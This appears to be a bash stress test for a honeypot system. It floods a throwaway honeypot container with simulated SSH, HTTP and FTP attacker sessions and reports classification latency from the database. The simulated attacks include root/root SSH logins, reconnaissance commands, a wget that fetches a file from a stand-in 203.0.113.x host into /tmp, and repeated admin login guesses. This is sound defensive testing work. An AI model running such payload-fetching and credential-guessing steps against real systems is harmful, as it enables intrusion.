#!/usr/bin/env bash
#
# NFR-2 / TC13: many concurrent attacker sessions, then the classification
# latency the backend measured for each of them.
#
#   sudo bash stress-test.sh                    # 500 sessions, all at once
#   sudo bash stress-test.sh --sessions 1000 --concurrency 250
#   sudo bash stress-test.sh --keep             # leave the sessions in place
#
# Like controlled-test.sh it attacks a throwaway engine registered as
# `controlled-test-node` on the internal network, never the production one,
# and purges what it produced unless --keep is given. Its connection and rate
# limits are lifted, because every simulated attacker shares one source
# address and the defaults would refuse all but a handful.
#
# Reported per session, from the database, not from this script's clock:
#   analysis_ms   the span the backend times itself, feature extraction
#                 through the stored verdict (NFR-2's 200 ms budget)
#   turnaround    session end, as the engine recorded it (start + duration),
#                 to the classified row being flushed (its created_at, set
#                 after the verdict is computed): the "post session
#                 termination" wording of NFR-2, delivery from engine included
#
# Run it on an otherwise idle host; anything else using the CPU is measured
# along with the system.

set -euo pipefail
cd "$(dirname "$0")"

SESSIONS=500
CONCURRENCY=500
KEEP=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    --sessions) SESSIONS=$2; shift 2 ;;
    --concurrency) CONCURRENCY=$2; shift 2 ;;
    --keep) KEEP=1; shift ;;
    *) echo "unknown option $1" >&2; exit 2 ;;
  esac
done

NODE=controlled-test-node
IMAGE=honeysentinel-honeypot
NET=honeysentinel_engine
psql() { docker compose exec -T postgres psql -U honeypot -d honeysentinel -v ON_ERROR_STOP=1 "$@"; }

set -a; . ./.env; set +a

existing=$(psql -Atc "select count(*) from honeypot_sessions s join honeypot_nodes n on n.id = s.node_id where n.name = '$NODE'")
if [[ "$existing" != 0 ]]; then
  echo "$existing session(s) already recorded under $NODE; run controlled-test.sh --purge-only first." >&2
  exit 1
fi

docker rm -f hs-stress >/dev/null 2>&1 || true
echo "==> Starting a throwaway engine as $NODE"
docker run -d --name hs-stress --network "$NET" \
  --read-only --tmpfs /tmp:noexec,nosuid --tmpfs /app/data:uid=10001,gid=10001 \
  --cap-drop ALL --security-opt no-new-privileges:true --dns 127.0.0.1 \
  -e HONEYPOT_CONTAINER=true -e HONEYPOT_NODE_NAME="$NODE" \
  -e HONEYPOT_PROTOCOLS=ssh,ftp,http -e HONEYPOT_CONTROL_BIND=127.0.0.1 \
  -e HONEYPOT_MAX_CONN_PER_IP=100000 -e HONEYPOT_RATE_LIMIT=1000000 \
  -e HONEYPOT_CAPTURE_DIR=/app/data/sessions -e HONEYPOT_FILE_CAPTURE_DIR=/app/data/uploads \
  -e HONEYPOT_LOG_DIR=/app/data/logs \
  -e BACKEND_API_URL=http://ingest:8000/api/v1 -e HONEYPOT_INGEST_TOKEN="$HONEYPOT_INGEST_TOKEN" \
  "$IMAGE" >/dev/null 2>&1
trap 'docker rm -f hs-stress >/dev/null 2>&1 || true' EXIT
for _ in $(seq 1 30); do
  docker logs hs-stress 2>&1 | grep -q "All honeypot services started" && break
  sleep 1
done

echo "==> Opening $SESSIONS sessions, $CONCURRENCY at a time"
started=$(date -u +%Y-%m-%dT%H:%M:%SZ)
docker run --rm -i --network "$NET" --dns 127.0.0.1 --cap-drop ALL \
  -e SESSIONS="$SESSIONS" -e CONCURRENCY="$CONCURRENCY" "$IMAGE" python - <<'PY'
import asyncio, os, time
import asyncssh

HOST = "hs-stress"
N, C = int(os.environ["SESSIONS"]), int(os.environ["CONCURRENCY"])

async def ssh(i):
    async with asyncssh.connect(HOST, 2222, username="root", password="root",
                                known_hosts=None, client_keys=None) as conn:
        for cmd in ("uname -a", "cat /proc/cpuinfo | grep name", f"wget http://203.0.113.{i % 250}/x -O /tmp/x"):
            await conn.run(cmd)

async def http(i):
    reader, writer = await asyncio.open_connection(HOST, 8080)
    body = f"username=admin&password=pass{i}".encode()
    writer.write(b"POST /login HTTP/1.1\r\nHost: x\r\nUser-Agent: stress/1.0\r\n"
                 b"Content-Type: application/x-www-form-urlencoded\r\n"
                 b"Content-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
    await writer.drain()
    await reader.read()
    writer.close()

async def ftp(i):
    reader, writer = await asyncio.open_connection(HOST, 2121)
    await reader.readline()
    for line in (b"USER anonymous", b"PASS x@example.com", b"PWD", b"QUIT"):
        writer.write(line + b"\r\n")
        await writer.drain()
        await reader.readline()
    writer.close()

KINDS = [ssh, ssh, ssh, ssh, ssh, http, http, http, ftp, ftp]

async def main():
    gate = asyncio.Semaphore(C)
    ok, failed = 0, {}

    async def one(i):
        nonlocal ok
        async with gate:
            try:
                await asyncio.wait_for(KINDS[i % len(KINDS)](i), timeout=120)
                ok += 1
            except Exception as exc:
                key = f"{KINDS[i % len(KINDS)].__name__}: {type(exc).__name__}"
                failed[key] = failed.get(key, 0) + 1

    t0 = time.perf_counter()
    await asyncio.gather(*(one(i) for i in range(N)))
    print(f"  {ok}/{N} sessions completed in {time.perf_counter() - t0:.1f}s; failures: {failed or 'none'}")

asyncio.run(main())
PY

echo "==> Waiting for the engine to finish ingesting"
last=-1
for _ in $(seq 1 60); do
  n=$(psql -Atc "select count(*) from honeypot_sessions s join honeypot_nodes n on n.id = s.node_id where n.name = '$NODE'")
  [[ "$n" == "$last" ]] && break
  last=$n; sleep 3
done

stamp=$(date -u +%Y%m%dT%H%M%SZ)
report="state/nfr2-$stamp.json"
psql -At > "$report" <<SQL
with s as (
  select s.analysis_ms,
         extract(epoch from (s.created_at - (s.started_at + make_interval(secs => coalesce(s.duration_seconds, 0))))) * 1000 as turnaround_ms,
         s.protocol
  from honeypot_sessions s join honeypot_nodes n on n.id = s.node_id
  where n.name = '$NODE'
)
select json_build_object(
  'test', 'TC13 / NFR-2 concurrent session stress',
  'started_at', '$started',
  'requested_sessions', $SESSIONS,
  'concurrency', $CONCURRENCY,
  'host', '$(hostname)', 'cpus', $(nproc),
  'recorded_sessions', (select count(*) from s),
  'by_protocol', (select json_object_agg(protocol, c) from (select protocol, count(*) c from s group by protocol) p),
  'analysis_ms', json_build_object(
    'p50', round(percentile_cont(0.50) within group (order by analysis_ms)::numeric, 2),
    'p95', round(percentile_cont(0.95) within group (order by analysis_ms)::numeric, 2),
    'p99', round(percentile_cont(0.99) within group (order by analysis_ms)::numeric, 2),
    'max', round(max(analysis_ms)::numeric, 2),
    'within_200ms_pct', round(100.0 * avg((analysis_ms <= 200)::int), 2)),
  'turnaround_ms', json_build_object(
    'p50', round(percentile_cont(0.50) within group (order by turnaround_ms)::numeric, 1),
    'p95', round(percentile_cont(0.95) within group (order by turnaround_ms)::numeric, 1),
    'p99', round(percentile_cont(0.99) within group (order by turnaround_ms)::numeric, 1),
    'max', round(max(turnaround_ms)::numeric, 1))
) from s;
SQL
model=$(docker compose exec -T backend python -c "from app.ai.classifier import classifier; classifier._ensure_loaded(); print(classifier.model_source)" 2>/dev/null | tail -1)
python3 - "$report" "$model" <<'PY'
import json, sys
path, model = sys.argv[1], sys.argv[2]
data = json.load(open(path))
data["model_source"] = model
json.dump(data, open(path, "w"), indent=2)
print(json.dumps(data, indent=2))
PY
echo "Report: $(pwd)/$report"

if [[ $KEEP -eq 0 ]]; then bash ./controlled-test.sh --purge-only; fi
